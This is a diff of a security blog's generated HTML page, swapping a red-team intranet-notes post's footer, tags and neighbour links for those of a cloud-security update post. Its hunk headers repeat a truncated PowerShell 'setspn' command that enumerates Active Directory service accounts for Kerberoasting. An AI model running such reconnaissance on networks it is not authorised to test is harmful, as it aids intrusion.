-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1170758">https://cloud.tencent.com/developer/article/1170758</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/11707302.html">https://www.cnblogs.com/zpchcbd/p/11707302.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">https://blog.csdn.net/wulantian/article/details/42418231</a></p>
-<p><a target="_blank" rel="noopener" href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p>
-<p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png"></p>
 
                 
             </div>
@@ -725,7 +558,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/210907-121204.html">https://www.teamssix.com/210907-121204.html</a>
+                    <a href="https://www.teamssix.com/220531-121945.html">https://www.teamssix.com/220531-121945.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -763,16 +596,16 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                                    <span class="chip bg-color">红队</span>
+                                <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">云安全</span>
                                 </a>
                             
-                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                                    <span class="chip bg-color">学习笔记</span>
+                                <a href="/tags/%E7%9F%A5%E8%AF%86%E6%96%87%E5%BA%93/">
+                                    <span class="chip bg-color">知识文库</span>
                                 </a>
                             
-                                <a href="/tags/%E5%86%85%E7%BD%91/">
-                                    <span class="chip bg-color">内网</span>
+                                <a href="/tags/%E6%9B%B4%E6%96%B0%E6%B1%87%E6%80%BB/">
+                                    <span class="chip bg-color">更新汇总</span>
                                 </a>
                             
                         </div>
@@ -817,7 +650,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
         repo: 'Gitalk',
         owner: 'teamssix',
         admin: "teamssix",
-        id: '2021-09-07T12-12-04',
+        id: '2022-05-31T12-19-45',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -843,16 +676,17 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/210908-105249.html">
+                <a href="/220531-121945.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908104558.png" class="responsive-img" alt="【内网学习笔记】25、Exchange 邮件服务器">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205311237409.png" class="responsive-img" alt="T Wiki 云安全知识库 5 月份更新汇总">
                         
-                        <span class="card-title">【内网学习笔记】25、Exchange 邮件服务器</span>
+                        <span class="card-title">T Wiki 云安全知识库 5 月份更新汇总</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -862,34 +696,35 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-31
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    内网学习笔记
+                            <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/" class="post-category">
+                                    云安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                        <span class="chip bg-color">红队</span>
+                    <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">云安全</span>
                     </a>
                     
-                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                        <span class="chip bg-color">学习笔记</span>
+                    <a href="/tags/%E7%9F%A5%E8%AF%86%E6%96%87%E5%BA%93/">
+                        <span class="chip bg-color">知识文库</span>
                     </a>
                     
-                    <a href="/tags/%E5%86%85%E7%BD%91/">
-                        <span class="chip bg-color">内网</span>
+                    <a href="/tags/%E6%9B%B4%E6%96%B0%E6%B1%87%E6%80%BB/">
+                        <span class="chip bg-color">更新汇总</span>
                     </a>
                     
                 </div>
@@ -903,12 +738,12 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/210904-110701.html">
+                <a href="/220530-165026.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210902171015.png" class="responsive-img" alt="【内网学习笔记】23、SMBExec 与 DCOM 的使用">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205301707311.png" class="responsive-img" alt="Terraform 使用入门以及在云上攻防中的作用">
                         
-                        <span class="card-title">【内网学习笔记】23、SMBExec 与 DCOM 的使用</span>
+                        <span class="card-title">Terraform 使用入门以及在云上攻防中的作用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -919,14 +754,14 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-04
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-30
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    内网学习笔记
+                            <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/" class="post-category">
+                                    云安全
                                 </a>
                             
                             
@@ -936,16 +771,12 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
-                        <span class="chip bg-color">红队</span>
+                    <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">云安全</span>
                     </a>
                     
-                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                        <span class="chip bg-color">学习笔记</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%86%85%E7%BD%91/">
-                        <span class="chip bg-color">内网</span>
+                    <a href="/tags/Terraform/">
+                        <span class="chip bg-color">Terraform</span>
                     </a>
                     
                 </div>
